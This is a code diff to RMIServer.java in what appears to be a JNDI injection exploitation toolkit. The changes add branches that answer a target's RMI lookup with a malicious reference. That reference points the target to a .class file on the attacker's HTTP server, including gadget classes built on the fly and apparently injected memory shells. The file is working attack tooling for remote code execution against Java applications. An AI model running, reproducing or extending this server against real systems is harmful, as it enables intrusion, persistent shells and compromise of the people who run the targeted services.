@@ -2,7 +2,10 @@ package com.qi4l.jndi;
 
 
 import com.qi4l.jndi.gadgets.Config.Config;
+import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.InjShell;
 import com.qi4l.jndi.gadgets.utils.Reflections;
+import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
 import org.apache.naming.ResourceRef;
@@ -21,6 +24,7 @@ import java.rmi.server.RemoteObject;
 import java.rmi.server.UID;
 import java.util.Arrays;
 
+import static com.qi4l.jndi.gadgets.Config.Config.*;
 import static org.fusesource.jansi.Ansi.ansi;
 
 
@@ -66,11 +70,11 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
 
 
     public static void start() {
-        String url = "http://" + Config.ip + ":" + Config.rmiPort;
+        String url = "http://" + ip + ":" + rmiPort;
 
         try {
-            System.out.println(ansi().render("@|green [+]|@ RMI  Server Start Listening on >>" + Config.rmiPort + "..."));
-            RMIServer c = new RMIServer(Config.rmiPort, new URL(url));
+            System.out.println(ansi().render("@|green [+]|@ RMI  Server Start Listening on >>" + rmiPort + "..."));
+            RMIServer c = new RMIServer(rmiPort, new URL(url));
             c.run();
         } catch (Exception e) {
             System.err.println("Listener error");
@@ -162,7 +166,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
     }
 
     private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
-        System.err.println(" RMI  服务器  >> 正在读取信息");
+        System.err.println("[+] RMI服务器 >> 正在读取信息");
 
         int op = in.read();
 
@@ -235,7 +239,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         }
 
         String object = (String) ois.readObject();
-        System.out.println(ansi().render("@|green [+]|@RMI  服务器  >> RMI 查询" + object + " " + method));
+        System.out.println(ansi().render("@|green [+]|@ RMI服务器 >> RMI 查询" + object + " " + method));
         out.writeByte(TransportConstants.Return); // transport op
         try (ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl)) {
 
@@ -245,12 +249,35 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
             //反射调用的类名
             ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
 
-            if (object.startsWith("Bypass")) {
-                System.out.println(ansi().render("@|green [+]|@RMI  服务器  >> 发送本地类加载引用"));
-                Reflections.setFieldValue(rw, "wrappee", execByEL());
-            } else {
-                System.out.println(ansi().render("@|green [+]|@RMI  服务器  >> 向目标发送 stub >> %s", new URL(this.classpathUrl, this.classpathUrl.getRef().replace('.', '/').concat(".class"))));
-                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", this.classpathUrl.getRef(), this.classpathUrl.toString()));
+            if (object.startsWith("Local")) {
+                System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 发送本地类加载引用"));
+                System.out.println("-------------------------------------- RMI Local  Refenrence Links --------------------------------------");
+                String[] cmd = object.split(" ");
+                final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(cmd[1]));
+                Reflections.setFieldValue(rw, "wrappee", EchoClass);
+            } else if (object.startsWith("E-")) {
+                String object1 = object.substring(object.indexOf('-') + 1);
+                final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(object1));
+                String className = EchoClass.getName();
+                String className1 = className.replaceAll("\\.", "/");
+                String turl = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
+                String classPath = className + ".class";
+                System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 向目标发送 stub >> %s", turl));
+                System.out.println("-------------------------------------- RMI Remote Refenrence Links --------------------------------------");
+                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", classPath, turl));
+            } else if (object.startsWith("M-")) {
+                //M-EX-MS-RFMSFromThreadF-bx#params
+                String object1 = object.substring(object.indexOf('-') + 1);
+                String[] parts = object1.split("#");
+                String[] parts1 = parts[1].split(" ");
+                InjShell.init(parts1);
+                String className = Gadgets.createClassB(parts[0]);
+                String className1 = className.replaceAll("\\.", "/");
+                String turl = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
+                String className2 = className1.substring(className1.lastIndexOf('/') +1 );
+                System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 向目标发送 stub >> %s", turl));
+                System.out.println("-------------------------------------- RMI Remote Refenrence Links --------------------------------------");
+                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", className2, turl));
             }
 
             Field refF = RemoteObject.class.getDeclaredField("ref");
